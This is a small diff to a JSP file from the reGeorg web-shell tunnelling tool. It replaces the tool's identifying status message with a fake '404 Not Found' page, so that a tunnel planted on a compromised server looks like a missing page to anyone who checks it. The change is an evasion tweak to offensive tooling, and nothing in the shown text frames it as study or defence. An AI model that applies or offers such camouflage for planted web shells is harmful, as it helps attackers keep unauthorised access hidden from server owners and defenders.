@@ -130,7 +130,7 @@ https://github.com/sensepost/reGeorg
             }
         } 
     } else {
-        //PrintWriter o = response.getWriter();  
-        out.print("Georg says, 'All seems fine'");
+        //PrintWriter o = response.getWriter();
+        out.print("<html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this server.</p></body></html>");
     }
 %>
